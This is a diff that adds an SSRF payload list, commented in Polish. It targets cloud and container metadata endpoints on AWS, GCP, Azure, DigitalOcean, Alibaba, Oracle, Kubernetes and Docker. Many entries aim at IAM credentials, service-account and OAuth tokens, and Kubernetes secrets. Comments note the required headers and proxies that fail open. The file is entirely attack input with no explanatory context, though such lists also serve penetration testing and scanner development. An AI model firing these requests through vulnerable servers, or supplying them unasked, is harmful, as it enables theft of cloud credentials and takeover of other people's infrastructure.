@@ -1,0 +1,44 @@
+# === AWS — IMDSv1 ===
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# === AWS — IMDSv2 (wymaga PUT token, ale niektóre proxy fail-open) ===
+# Header: X-aws-ec2-metadata-token: <token>
+http://169.254.169.254/latest/api/token
+
+# === AWS ECS task metadata ===
+http://169.254.170.2/v2/credentials/
+
+# === GCP ===
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/instance/service-accounts/default/token
+http://169.254.169.254/computeMetadata/v1/
+# Wymaga header: Metadata-Flavor: Google
+
+# === Azure ===
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+# Wymaga header: Metadata: true
+
+# === DigitalOcean ===
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1.json
+
+# === Alibaba Cloud ===
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+
+# === Oracle Cloud ===
+http://169.254.169.254/opc/v1/instance/
+http://169.254.169.254/opc/v1/identity/
+
+# === Kubernetes API (gdy SSRF z poda) ===
+https://kubernetes.default.svc/api/v1/namespaces/default/pods/
+https://kubernetes.default.svc/api/v1/secrets
+
+# === Docker socket ===
+http://localhost/v1.40/containers/json
+http://127.0.0.1:2375/containers/json
